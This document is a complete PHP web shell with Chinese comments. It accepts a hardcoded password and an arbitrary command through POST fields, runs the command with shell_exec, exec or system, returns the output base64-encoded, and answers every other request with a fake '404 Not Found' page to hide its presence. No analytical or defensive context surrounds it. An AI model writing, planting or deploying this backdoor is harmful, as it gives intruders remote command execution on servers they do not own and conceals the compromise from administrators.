<?php
// 简单的密码验证
$password = "test123";

if (isset($_POST['pwd']) && $_POST['pwd'] === $password) {
    if (isset($_POST['cmd'])) {
        // 使用PHP内置函数执行命令
        $output = "";
        if (function_exists('shell_exec')) {
            $output = shell_exec($_POST['cmd']);
        } elseif (function_exists('exec')) {
            exec($_POST['cmd'], $output);
            $output = implode("\n", $output);
        } elseif (function_exists('system')) {
            ob_start();
            system($_POST['cmd']);
            $output = ob_get_clean();
        }
        echo base64_encode($output);
    }
} else {
    http_response_code(404);
    echo "404 Not Found";
} 